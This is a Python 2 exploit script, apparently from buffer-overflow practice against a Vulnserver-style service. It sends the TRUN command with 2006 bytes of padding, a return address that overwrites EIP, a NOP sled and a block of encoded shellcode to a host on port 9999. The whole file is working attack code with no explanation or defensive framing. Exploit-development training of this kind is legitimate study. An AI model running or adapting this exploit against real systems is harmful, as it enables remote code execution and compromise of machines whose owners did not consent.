#!/usr/bin/python
import socket
server = '172.16.121.139'
sport = 9999

#length = int(raw_input('Length of attack: '))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))
print s.recv(1024)

offset = 'A' * 2006
eip = '\xAF\x11\x50\x62'
extranops = '\x90' * 12

shellcode = (
"\xdb\xc7\xd9\x74\x24\xf4\x5d\x29\xc9\xb1\x52\xbf\x07\xb3\xe7"
"\x1a\x31\x7d\x17\x03\x7d\x17\x83\xc2\xb7\x05\xef\x30\x5f\x4b"
"\x10\xc8\xa0\x2c\x98\x2d\x91\x6c\xfe\x26\x82\x5c\x74\x6a\x2f"
"\x16\xd8\x9e\xa4\x5a\xf5\x91\x0d\xd0\x23\x9c\x8e\x49\x17\xbf"
"\x0c\x90\x44\x1f\x2c\x5b\x99\x5e\x69\x86\x50\x32\x22\xcc\xc7"
"\xa2\x47\x98\xdb\x49\x1b\x0c\x5c\xae\xec\x2f\x4d\x61\x66\x76"
"\x4d\x80\xab\x02\xc4\x9a\xa8\x2f\x9e\x11\x1a\xdb\x21\xf3\x52"
"\x24\x8d\x3a\x5b\xd7\xcf\x7b\x5c\x08\xba\x75\x9e\xb5\xbd\x42"
"\xdc\x61\x4b\x50\x46\xe1\xeb\xbc\x76\x26\x6d\x37\x74\x83\xf9"
"\x1f\x99\x12\x2d\x14\xa5\x9f\xd0\xfa\x2f\xdb\xf6\xde\x74\xbf"
"\x97\x47\xd1\x6e\xa7\x97\xba\xcf\x0d\xdc\x57\x1b\x3c\xbf\x3f"
"\xe8\x0d\x3f\xc0\x66\x05\x4c\xf2\x29\xbd\xda\xbe\xa2\x1b\x1d"
"\xc0\x98\xdc\xb1\x3f\x23\x1d\x98\xfb\x77\x4d\xb2\x2a\xf8\x06"
"\x42\xd2\x2d\x88\x12\x7c\x9e\x69\xc2\x3c\x4e\x02\x08\xb3\xb1"
"\x32\x33\x19\xda\xd9\xce\xca\x49\x0d\xa9\x86\xfa\x2c\x49\x86"
"\xa6\xb9\xaf\xc2\x46\xec\x78\x7b\xfe\xb5\xf2\x1a\xff\x63\x7f"
"\x1c\x8b\x87\x80\xd3\x7c\xed\x92\x84\x8c\xb8\xc8\x03\x92\x16"
"\x64\xcf\x01\xfd\x74\x86\x39\xaa\x23\xcf\x8c\xa3\xa1\xfd\xb7"
"\x1d\xd7\xff\x2e\x65\x53\x24\x93\x68\x5a\xa9\xaf\x4e\x4c\x77"
"\x2f\xcb\x38\x27\x66\x85\x96\x81\xd0\x67\x40\x58\x8e\x21\x04"
"\x1d\xfc\xf1\x52\x22\x29\x84\xba\x93\x84\xd1\xc5\x1c\x41\xd6"
"\xbe\x40\xf1\x19\x15\xc1\x11\xf8\xbf\x3c\xba\xa5\x2a\xfd\xa7"
"\x55\x81\xc2\xd1\xd5\x23\xbb\x25\xc5\x46\xbe\x62\x41\xbb\xb2"
"\xfb\x24\xbb\x61\xfb\x6c" )

maxsize = "C" *(3500- 2006 - 4 - 12 - 351) # MAXSize - `offset - eip - extranops - badchars

#print "Sending attack length ", length, ' to TRUN .'
attack = offset + eip + extranops + shellcode + maxsize

s.send(('TRUN .' + attack + '\r\n'))
print s.recv(1024)
s.send('EXIT\r\n')
print s.recv(1024)
s.close()
